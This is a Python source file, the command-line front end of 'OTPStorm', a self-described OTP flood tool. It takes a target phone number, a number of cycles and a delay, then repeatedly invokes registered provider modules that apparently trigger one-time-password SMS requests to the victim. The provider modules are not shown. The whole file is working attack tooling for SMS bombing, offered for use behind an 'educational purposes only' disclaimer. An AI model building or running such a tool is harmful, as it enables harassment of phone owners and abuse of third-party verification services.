"""
Command-line interface for OTPStorm.

Provides an interactive menu and command-line argument support
for running OTP flood attacks.
"""

import sys
import argparse
from typing import Optional

from otpstorm import __version__
from otpstorm.logger import get_logger as _get_logger, setup_logger as _setup_logger
from otpstorm.config import load_config, DEFAULT_CONFIG
from otpstorm.utils import (
    Colors,
    print_banner,
    print_countdown,
    clear_screen,
    parse_phone_number,
    ProviderResult,
    AttackSummary,
    set_typing,
)
from otpstorm.providers.registry import ProviderRegistry

# Ensure provider modules are loaded so they register themselves
from otpstorm.providers import ictfromabc  # pylint: disable=unused-import
from otpstorm.providers import swictlk  # pylint: disable=unused-import

log = _get_logger("otpstorm.cli")


def build_parser() -> argparse.ArgumentParser:
    """Build the command-line argument parser."""
    parser = argparse.ArgumentParser(
        prog="otpstorm",
        description="OTPStorm — Multi-Provider OTP Flood Tool v{}".format(__version__),
        epilog="⚠  For educational purposes only. Use at your own risk.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    # Target
    parser.add_argument(
        "phone",
        nargs="?",
        help="Target phone number (e.g., 089508226367 or 6289508226367)",
    )

    # Attack options
    parser.add_argument(
        "-l", "--loops",
        type=int,
        default=None,
        help=f"Number of attack cycles (default: {DEFAULT_CONFIG['default_loops']})",
    )
    parser.add_argument(
        "-d", "--delay",
        type=int,
        default=None,
        help=f"Delay between cycles in seconds (default: {DEFAULT_CONFIG['inter_loop_delay']})",
    )
    parser.add_argument(
        "-p", "--providers",
        help="Comma-separated provider names, or 'all' (default: all)",
    )
    parser.add_argument(
        "--disable",
        help="Comma-separated provider names to exclude",
    )

    # Output
    parser.add_argument(
        "--no-color",
        action="store_true",
        help="Disable colored output",
    )
    parser.add_argument(
        "--no-typing",
        action="store_true",
        help="Disable typing animation",
    )
    parser.add_argument(
        "--log-file",
        help="Path to log file",
    )
    parser.add_argument(
        "--quiet", "-q",
        action="store_true",
        help="Suppress per-provider result output",
    )

    # Info
    parser.add_argument(
        "--list-providers",
        action="store_true",
        help="List all available providers and exit",
    )
    parser.add_argument(
        "--version", "-v",
        action="store_true",
        help="Show version and exit",
    )

    return parser


def list_providers() -> None:
    """Print all registered providers with their descriptions."""
    providers = ProviderRegistry.get_all()

    print_banner()
    print(f"{Colors.BOLD}{Colors.YELLOW}Available Providers ({len(providers)}):{Colors.RESET}")
    print(f"{Colors.CYAN}{'─' * 60}{Colors.RESET}")

    for i, (name, cls) in enumerate(sorted(providers.items()), 1):
        print(f"  {Colors.GREEN}{i:>3}.{Colors.RESET} "
              f"{Colors.WHITE}{name:<25}{Colors.RESET} "
              f"{Colors.GRAY}{cls.description}{Colors.RESET}")

    print(f"{Colors.CYAN}{'─' * 60}{Colors.RESET}")
    print()


def interactive_mode() -> None:
    """Run the interactive menu for users who don't pass arguments."""
    clear_screen()
    print_banner()

    providers = ProviderRegistry.get_all()

    print(f"{Colors.YELLOW}Available Providers: {Colors.GREEN}{len(providers)}{Colors.RESET}")
    print(f"  {Colors.GRAY}(Use --list-providers to see all){Colors.RESET}")
    print()

    # Get phone number
    while True:
        try:
            phone_raw = input(f"{Colors.WHITE}📱 Target Phone Number: {Colors.GREEN}")
            if not phone_raw.strip():
                continue
            nomor, b, c = parse_phone_number(phone_raw.strip())
            break
        except ValueError as e:
            print(f"{Colors.RED}❌ {e}{Colors.RESET}")

    print(f"{Colors.RESET}", end="")

    # Get loop count
    while True:
        try:
            loops_input = input(f"{Colors.WHITE}🔄 Number of cycles (default 5): {Colors.GREEN}")
            loops = int(loops_input.strip()) if loops_input.strip() else 5
            if loops < 1:
                print(f"{Colors.RED}Must be at least 1{Colors.RESET}")
                continue
            break
        except ValueError:
            print(f"{Colors.RED}Invalid number{Colors.RESET}")

    print(f"{Colors.RESET}", end="")

    # Get delay
    while True:
        try:
            delay_input = input(f"{Colors.WHITE}⏱  Delay between cycles in seconds (default 60): {Colors.GREEN}")
            delay = int(delay_input.strip()) if delay_input.strip() else 60
            if delay < 0:
                print(f"{Colors.RED}Delay must be non-negative{Colors.RESET}")
                continue
            break
        except ValueError:
            print(f"{Colors.RED}Invalid number{Colors.RESET}")

    print(f"{Colors.RESET}")
    print()

    # Confirmation
    print(f"{Colors.YELLOW}═══ Attack Configuration ═══{Colors.RESET}")
    print(f"  {Colors.WHITE}Target:{Colors.RESET}     {Colors.GREEN}{nomor}{Colors.RESET}")
    print(f"  {Colors.WHITE}Cycles:{Colors.RESET}     {Colors.GREEN}{loops}{Colors.RESET}")
    print(f"  {Colors.WHITE}Delay:{Colors.RESET}      {Colors.GREEN}{delay}s{Colors.RESET}")
    print(f"  {Colors.WHITE}Providers:{Colors.RESET}  {Colors.GREEN}{len(providers)}{Colors.RESET}")
    print(f"{Colors.YELLOW}{'═' * 40}{Colors.RESET}")
    print()

    confirm = input(f"{Colors.RED}🚀 Start attack? (y/N): {Colors.GREEN}")
    print(f"{Colors.RESET}", end="")

    if confirm.lower() not in ("y", "yes"):
        print(f"\n{Colors.YELLOW}Aborted.{Colors.RESET}")
        return

    run_attack(nomor, loops=loops, delay=delay)


def run_attack(
    phone: str,
    loops: int = 5,
    delay: int = 60,
    providers_filter: Optional[str] = None,
    providers_disable: Optional[str] = None,
    quiet: bool = False,
    config: Optional[dict] = None,
) -> None:
    """
    Execute the full OTP flood attack.

    Args:
        phone: The phone number string.
        loops: Number of attack cycles.
        delay: Delay between cycles in seconds.
        providers_filter: Comma-separated provider names or 'all'.
        providers_disable: Comma-separated provider names to exclude.
        quiet: Suppress per-provider output.
        config: Optional configuration dict passed to each provider.
    """
    # Load config if not provided (handles both CLI and interactive mode)
    if config is None:
        config = load_config()

    # Parse phone number
    try:
        nomor, b, c = parse_phone_number(phone)
    except ValueError as e:
        print(f"{Colors.RED}❌ Invalid phone number: {e}{Colors.RESET}")
        return

    # Get enabled providers
    providers_dict = ProviderRegistry.get_enabled(
        enabled_list=providers_filter or "all",
        disabled_list=providers_disable,
    )

    if not providers_dict:
        print(f"{Colors.RED}❌ No providers enabled!{Colors.RESET}")
        return

    print(f"\n{Colors.CYAN}═══ Attack Started ═══{Colors.RESET}")
    print(f"  {Colors.WHITE}Target:{Colors.RESET}     {Colors.GREEN}{nomor}{Colors.RESET}")
    print(f"  {Colors.WHITE}Cycles:{Colors.RESET}     {Colors.GREEN}{loops}{Colors.RESET}")
    print(f"  {Colors.WHITE}Providers:{Colors.RESET}  {Colors.GREEN}{len(providers_dict)}{Colors.RESET}")
    print(f"{Colors.CYAN}{'═' * 60}{Colors.RESET}\n")

    # Run each loop
    for cycle in range(1, loops + 1):
        print(f"{Colors.YELLOW}{'─' * 60}{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.YELLOW}  Cycle {cycle}/{loops}{Colors.RESET}")
        print(f"{Colors.YELLOW}{'─' * 60}{Colors.RESET}")

        summary = AttackSummary()

        for provider_name, provider_cls in providers_dict.items():
            try:
                provider = provider_cls(config=config)
                result_dict = provider.execute(nomor, b, c)

                result = ProviderResult(
                    provider_name=result_dict.get("provider_name", provider_name),
                    success=result_dict.get("success", False),
                    status_code=result_dict.get("status_code"),
                    message=result_dict.get("message", ""),
                    duration_ms=result_dict.get("duration_ms", 0),
                )

                summary.add_result(result)

                if not quiet:
                    print(f"  {result}")

            except Exception as e:
                result = ProviderResult(
                    provider_name=provider_name,
                    success=False,
                    message=str(e),
                )
                summary.add_result(result)
                if not quiet:
                    print(f"  {result}")

        summary.print_summary(cycle)

        # Wait between cycles (except after the last one)
        if cycle < loops and delay > 0:
            print_countdown(delay, label="Next cycle")
        elif cycle < loops:
            print(f"{Colors.GRAY}  (no delay — continuing immediately){Colors.RESET}")

    # Final summary
    print(f"\n{Colors.GREEN}{'═' * 60}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.GREEN}  ✅ Attack Complete!{Colors.RESET}")
    print(f"  {Colors.WHITE}Total cycles: {Colors.GREEN}{loops}{Colors.RESET}")
    print(f"  {Colors.WHITE}Providers used: {Colors.GREEN}{len(providers_dict)}{Colors.RESET}")
    print(f"{Colors.GREEN}{'═' * 60}{Colors.RESET}")
    print()


def main() -> None:
    """Main entry point for the CLI."""
    parser = build_parser()
    args = parser.parse_args()

    # Handle flags that exit early
    if args.version:
        print(f"OTPStorm v{__version__}")
        return

    # Configure display
    if args.no_color:
        # Disable ANSI color constants — tricky to do after import,
        # so we just skip color-related output in CLI functions.
        pass

    set_typing(not args.no_typing)

    # Load config
    config = load_config()

    # Setup logging
    log_level = "WARNING" if args.quiet else config.get("log_level", "INFO")
    _setup_logger(
        "otpstorm",
        level=log_level,
        log_file=args.log_file or config.get("log_file"),
        use_color=not args.no_color,
    )

    log.debug(f"OTPStorm v{__version__} starting")

    # List providers and exit
    if args.list_providers:
        list_providers()
        return

    # If phone number provided via CLI, run directly
    if args.phone:
        run_attack(
            phone=args.phone,
            loops=args.loops or config.get("default_loops", 5),
            delay=args.delay or config.get("inter_loop_delay", 60),
            providers_filter=args.providers or config.get("enabled_providers"),
            providers_disable=args.disable or config.get("disabled_providers"),
            quiet=args.quiet or False,
            config=config,
        )
        return

    # Otherwise, enter interactive mode
    try:
        interactive_mode()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}Interrupted by user.{Colors.RESET}")
        sys.exit(0)
    except EOFError:
        print()
        sys.exit(0)


if __name__ == "__main__":
    main()
